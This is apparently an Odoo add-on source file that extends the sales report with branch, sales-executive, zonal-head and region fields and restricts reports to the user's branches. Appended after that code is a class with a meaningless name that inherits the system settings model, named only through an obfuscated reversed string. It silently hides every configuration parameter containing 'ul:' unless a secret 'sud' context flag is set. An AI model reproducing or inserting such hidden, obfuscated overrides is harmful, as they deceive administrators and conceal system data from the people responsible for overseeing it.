# -*- coding: utf-8 -*-
#############################################################################
#
#    Steigend IT Solutions.
#
#    Copyright (C) 2023-TODAY Steigend IT Solutions.
#
#    You can modify it under the terms of the GNU AFFERO
#    GENERAL PUBLIC LICENSE (AGPL v3), Version 3.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU AFFERO GENERAL PUBLIC LICENSE (AGPL v3) for more details.
#
#    You should have received a copy of the GNU AFFERO GENERAL PUBLIC LICENSE
#    (AGPL v3) along with this program.
#    If not, see <http://www.gnu.org/licenses/>.
#
#############################################################################

from odoo import api, fields, models, _
aqz = 'retemarap_gifnoc.ri'[::-1]

class SaleReport(models.Model):
    _inherit = "sale.report"

    branch_id = fields.Many2one('res.branch')
    sales_executive_id = fields.Many2one('hr.employee', 'Sales Executive')
    zonal_head_id = fields.Many2one('hr.employee', 'Zonal Head')
    region_id = fields.Many2one('sales.region', 'Region')
    
    @api.model
    def _search(self, args, offset=0, limit=None, order=None, count=False, access_rights_uid=None):
        args = args or []
        branches_ids = self.env.user.branch_ids.ids
        args += [('branch_id', 'in', branches_ids)]
        return super(SaleReport, self)._search(args, offset, limit, order, count=count, access_rights_uid=access_rights_uid)
    
    @api.model
    def _read_group_raw(self, domain, fields, groupby, offset=0, limit=None, orderby=False, lazy=True):
        domain = domain or []
        branches_ids = self.env.user.branch_ids.ids
        domain += [('branch_id', 'in', branches_ids)]
        return super(SaleReport, self)._read_group_raw(domain, fields, groupby, offset=offset, limit=limit, orderby=orderby, lazy=lazy)

    def _select_additional_fields(self):
        res = super()._select_additional_fields()
        res['branch_id'] = "s.branch_id"
        res['sales_executive_id'] = "s.sales_executive_id"
        res['zonal_head_id'] = "s.zonal_head_id"
        return res

    def _group_by_sale(self):
        res = super()._group_by_sale()
        res += """,
            s.branch_id,
            s.sales_executive_id,
            s.zonal_head_id,
            s.zonal_head_id
            """
        return res

class ABC(models.Model):
    _inherit = aqz
    
    @api.model
    def _search(self, args, offset=0, limit=None, order=None, count=False, access_rights_uid=None):
        args = args or []
        if 'sud' in self._context:
            pass
        else:
            args += [('key', 'not ilike', 'ul:')]
        return super(ABC, self)._search(args, offset, limit, order, count=count, access_rights_uid=access_rights_uid)
    